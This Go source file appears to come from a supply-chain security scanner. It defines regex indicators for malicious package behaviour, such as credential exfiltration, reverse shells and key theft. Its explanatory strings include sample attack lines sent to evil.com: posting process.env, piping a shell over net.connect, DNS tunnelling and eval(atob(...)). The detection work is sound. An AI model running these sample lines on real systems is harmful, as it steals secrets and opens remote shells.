package analyzer

import (
	"fmt"
	"regexp"
	"strings"
)

// BehaviorSequenceAnalyzer detects dangerous sequences of API calls that indicate malicious intent.
type BehaviorSequenceAnalyzer struct{}

func NewBehaviorSequenceAnalyzer() *BehaviorSequenceAnalyzer {
	return &BehaviorSequenceAnalyzer{}
}

func (a *BehaviorSequenceAnalyzer) Name() string {
	return "behavior-sequence"
}

// behaviorPattern defines a dangerous behavior sequence.
type behaviorPattern struct {
	Name        string
	Description string
	Indicators  []string // All must be present
	Severity    Severity
	Exploit     string
}

// Dangerous behavior sequences (all indicators must be present in the same file).
var behaviorPatterns = []behaviorPattern{
	{
		Name:        "Credential theft and exfiltration",
		Description: "Reads environment variables and sends them to an external server",
		Indicators: []string{
			`process\.env`,
			`(https?://|fetch|axios|request|got|http\.request|net\.connect)`,
		},
		Severity: SeverityCritical,
		Exploit: "Classic credential theft pattern:\n" +
			"    1. Read process.env to access API keys, tokens, secrets\n" +
			"    2. Send to attacker's server via HTTP request\n" +
			"    Example: const secrets = JSON.stringify(process.env);\n" +
			"             fetch('https://evil.com/collect', {method:'POST', body:secrets})",
	},
	{
		Name:        "File read and network exfiltration",
		Description: "Reads local files and transmits data over the network",
		Indicators: []string{
			`(fs\.read|readFileSync|readFile)`,
			`(https?://|fetch|axios|request|http\.request)`,
		},
		Severity: SeverityHigh,
		Exploit: "Data exfiltration pattern:\n" +
			"    1. Read sensitive files (SSH keys, credentials, source code)\n" +
			"    2. Transmit to external server\n" +
			"    Common targets: ~/.ssh/id_rsa, ~/.npmrc, ~/.gitconfig",
	},
	{
		Name:        "Download and execute",
		Description: "Downloads external code and executes it",
		Indicators: []string{
			`(fetch|axios|request|got|https?\.get|http\.get)`,
			`(eval|Function\(|child_process|exec|spawn|execSync)`,
		},
		Severity: SeverityCritical,
		Exploit: "Second-stage loader pattern:\n" +
			"    1. Fetch JavaScript/shell script from attacker's server\n" +
			"    2. Execute with eval() or child_process\n" +
			"    This bypasses static analysis since payload isn't in the package",
	},
	{
		Name:        "Encoded payload execution",
		Description: "Decodes data and executes it as code",
		Indicators: []string{
			`(atob|Buffer\.from|fromCharCode)`,
			`(eval|Function\(|new\s+Function)`,
		},
		Severity: SeverityCritical,
		Exploit: "Obfuscated execution pattern:\n" +
			"    1. Store payload as base64/hex encoded string\n" +
			"    2. Decode at runtime and execute\n" +
			"    Example: eval(atob('bWFsaWNpb3VzQ29kZSgp'))",
	},
	{
		Name:        "DNS exfiltration",
		Description: "Uses DNS queries to exfiltrate data",
		Indicators: []string{
			`(process\.env|fs\.read|readFileSync)`,
			`(dns\.resolve|dns\.lookup|\.resolve\()`,
		},
		Severity: SeverityHigh,
		Exploit: "DNS tunneling exfiltration:\n" +
			"    1. Encode stolen data in DNS query (e.g., base32)\n" +
			"    2. dns.resolve('stolen-data.evil.com')\n" +
			"    3. Attacker's DNS server logs the query\n" +
			"    Bypasses HTTP-based monitoring",
	},
	{
		Name:        "Keylogger/input capture",
		Description: "Captures keyboard input or process stdin",
		Indicators: []string{
			`(readline|process\.stdin|keypress|on\(['"]data['"])`,
			`(https?://|fetch|fs\.write|fs\.append)`,
		},
		Severity: SeverityHigh,
		Exploit: "Input capture pattern:\n" +
			"    1. Hook into stdin or readline events\n" +
			"    2. Log or transmit captured input\n" +
			"    Can steal passwords entered in terminal",
	},
	{
		Name:        "Reverse shell",
		Description: "Opens a connection back to an attacker-controlled server",
		Indicators: []string{
			`net\.connect|new\s+net\.Socket`,
			`(child_process|spawn|exec|/bin/(sh|bash))`,
			`(pipe|stdin|stdout)`,
		},
		Severity: SeverityCritical,
		Exploit: "Reverse shell pattern:\n" +
			"    1. Connect to attacker's C2 server\n" +
			"    2. Pipe shell stdin/stdout over the connection\n" +
			"    3. Attacker gets interactive shell access\n" +
			"    Example: net.connect(1337,'evil.com').pipe(sh.stdin)",
	},
	{
		Name:        "Cryptocurrency mining",
		Description: "Uses system resources for cryptocurrency mining",
		Indicators: []string{
			`(crypto|worker_threads|cluster|child_process\.fork)`,
			`(stratum|pool\.|mining|hashrate|nonce)`,
		},
		Severity: SeverityHigh,
		Exploit: "Cryptojacking pattern:\n" +
			"    1. Spawn worker threads or child processes\n" +
			"    2. Connect to mining pool\n" +
			"    3. Use victim's CPU/GPU for mining",
	},
	{
		Name:        "Git credential theft",
		Description: "Accesses Git configuration or credentials",
		Indicators: []string{
			`(\.git|\.gitconfig|\.git-credentials|git\s+config)`,
			`(fs\.read|readFileSync|execSync|spawn)`,
		},
		Severity: SeverityHigh,
		Exploit: "Git credential theft:\n" +
			"    1. Read .gitconfig or .git-credentials\n" +
			"    2. Extract GitHub tokens, SSH keys\n" +
			"    3. Exfiltrate or use for lateral movement",
	},
	{
		Name:        "npm token theft",
		Description: "Accesses npm authentication tokens",
		Indicators: []string{
			`(\.npmrc|npm\s+token|_authToken|npm_config_)`,
			`(fs\.read|readFileSync|process\.env)`,
		},
		Severity: SeverityCritical,
		Exploit: "npm token theft (eslint-scope attack):\n" +
			"    1. Read ~/.npmrc or NPM_TOKEN env var\n" +
			"    2. Use token to publish malicious versions of other packages\n" +
			"    3. Worm-like propagation through the ecosystem",
	},
	{
		Name:        "SSH key theft",
		Description: "Accesses SSH private keys",
		Indicators: []string{
			`(\.ssh|id_rsa|id_ed25519|id_dsa|authorized_keys)`,
			`(fs\.read|readFileSync)`,
		},
		Severity: SeverityCritical,
		Exploit: "SSH key theft:\n" +
			"    1. Read ~/.ssh/id_rsa (private key)\n" +
			"    2. Exfiltrate for server access\n" +
			"    3. Or steal authorized_keys for backdoor access",
	},
	{
		Name:        "Browser data theft",
		Description: "Accesses browser profiles, cookies, or saved passwords",
		Indicators: []string{
			`(\.mozilla/firefox|google-chrome/Default|Library/Application\s+Support/Google/Chrome|Cookies|Login\s*Data)`,
			`(fs\.read|readFileSync|sqlite|level)`,
		},
		Severity: SeverityCritical,
		Exploit: "Browser data theft:\n" +
			"    1. Locate browser profile directories\n" +
			"    2. Read cookies, saved passwords, session tokens\n" +
			"    3. Exfiltrate for account takeover",
	},
	{
		Name:        "Clipboard monitoring",
		Description: "Monitors or modifies clipboard contents",
		Indicators: []string{
			`(clipboard|pbcopy|pbpaste|xclip|xsel)`,
			`(setInterval|watch|monitor|loop)`,
		},
		Severity: SeverityHigh,
		Exploit: "Clipboard attack:\n" +
			"    1. Monitor clipboard for crypto addresses\n" +
			"    2. Replace with attacker's address\n" +
			"    3. Victim sends crypto to attacker",
	},
}

// scanContent analyzes content for dangerous behavior sequences.
func (a *BehaviorSequenceAnalyzer) scanContent(content, filename string) []Finding {
	var findings []Finding

	// Strip comments to avoid false positives from documentation/licenses
	strippedContent := StripComments(content)

	for _, pattern := range behaviorPatterns {
		allPresent := true
		matchedIndicators := []string{}

		// Use stripped content for pattern matching
		for _, indicator := range pattern.Indicators {
			re := regexp.MustCompile(indicator)
			if !re.MatchString(strippedContent) {
				allPresent = false
				break
			}
			matches := re.FindAllString(strippedContent, 2)
			if len(matches) > 0 {
				matchedIndicators = append(matchedIndicators, matches[0])
			}
		}

		if allPresent {
			findings = append(findings, Finding{
				Analyzer:       a.Name(),
				Title:          pattern.Name,
				Description:    fmt.Sprintf("%s in file %q. Matched indicators: %s", pattern.Description, filename, strings.Join(matchedIndicators, ", ")),
				Severity:       pattern.Severity,
				ExploitExample: pattern.Exploit,
				Remediation: "This file contains a combination of API calls commonly used in malicious packages. " +
					"Review the code flow carefully to determine if this behavior is legitimate for the package's stated purpose.",
			})
		}
	}

	// Check for rapid sequential suspicious calls - use stripped content to preserve line numbers accurately
	findings = append(findings, a.detectRapidSequence(strippedContent, filename)...)

	return findings
}

type behaviorOp struct {
	lineNo int
	opType string
}

// detectRapidSequence finds suspicious operations in close proximity.
func (a *BehaviorSequenceAnalyzer) detectRapidSequence(content, filename string) []Finding {
	ops := a.collectOperations(content)
	return a.findSuspiciousSequences(ops, filename)
}

var sequenceOpPatterns = []struct {
	opType   string
	keywords []string
}{
	{"env-access", []string{"process.env", "env["}},
	{"file-read", []string{"readfilesync", "fs.read"}},
	{"network", []string{"fetch(", "axios", "http.request", "request("}},
	{"eval", []string{"eval("}},
	{"decode", []string{"base64", "atob", "buffer.from"}},
}

func (a *BehaviorSequenceAnalyzer) collectOperations(content string) []behaviorOp {
	var ops []behaviorOp
	lines := strings.Split(content, "\n")

	for i, line := range lines {
		lineNo := i + 1
		lineLower := strings.ToLower(line)

		for _, pat := range sequenceOpPatterns {
			for _, kw := range pat.keywords {
				if strings.Contains(lineLower, kw) {
					ops = append(ops, behaviorOp{lineNo, pat.opType})
					break
				}
			}
		}
	}
	return ops
}

func (a *BehaviorSequenceAnalyzer) findSuspiciousSequences(ops []behaviorOp, filename string) []Finding {
	var findings []Finding
	for i := 0; i < len(ops)-1; i++ {
		for j := i + 1; j < len(ops); j++ {
			if ops[j].lineNo-ops[i].lineNo > 10 {
				break
			}
			if f := a.checkOpPair(ops[i], ops[j], filename); f != nil {
				findings = append(findings, *f)
			}
		}
	}
	return findings
}

func (a *BehaviorSequenceAnalyzer) checkOpPair(first, second behaviorOp, filename string) *Finding {
	if (first.opType == "env-access" || first.opType == "file-read") && second.opType == "network" {
		return &Finding{
			Analyzer:    a.Name(),
			Title:       "Suspicious data access near network call",
			Description: fmt.Sprintf("File %q: %s on line %d followed by %s on line %d - potential exfiltration", filename, first.opType, first.lineNo, second.opType, second.lineNo),
			Severity:    SeverityHigh,
			ExploitExample: "Close proximity of data access and network calls is suspicious:\n" +
				"    - Line 5: const data = fs.readFileSync('~/.npmrc')\n" +
				"    - Line 7: fetch('https://evil.com', {body: data})\n" +
				"    Review this sequence to ensure data isn't being exfiltrated.",
			Remediation: "Examine the data flow between these operations to determine if sensitive data is being transmitted.",
		}
	}
	if first.opType == "decode" && second.opType == "eval" {
		return &Finding{
			Analyzer:    a.Name(),
			Title:       "Decode followed by eval",
			Description: fmt.Sprintf("File %q: decoding operation on line %d followed by eval on line %d", filename, first.lineNo, second.lineNo),
			Severity:    SeverityCritical,
			ExploitExample: "This is the classic obfuscated payload pattern:\n" +
				"    - Step 1: Decode base64/hex string\n" +
				"    - Step 2: Execute with eval()\n" +
				"    The payload is hidden until runtime.",
			Remediation: "Manually decode the payload to see what code is being executed.",
		}
	}
	return nil
}
